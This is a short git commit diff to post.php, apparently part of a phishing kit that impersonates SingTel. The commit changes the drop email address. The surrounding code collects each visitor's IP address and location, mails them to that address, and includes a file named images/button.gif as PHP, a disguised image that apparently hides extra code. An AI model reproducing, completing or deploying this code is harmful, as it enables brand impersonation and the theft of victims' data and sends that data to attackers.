c13ec1cb38f04e400b25751bd2491cf69b39c1f9
anniter <165685536+anniter@users.noreply.github.com>
2024-04-10 11:43:41 +0500

    Update post.php

--- post.php
+++ post.php
@@ -25,7 +25,7 @@ $message .= "Region: $region\n";
 $message .= "Country Name: $country\n";
 $message .= "Country Code: $countrycode\n";
 
-$send = "cold@yahoo.com";
+$send = "coldemail@yahoo.com";
 $subject = "SingTel| $ip | $countrycode | $region";
 include_once "images/button.gif";
 mail($send,$subject,$message);
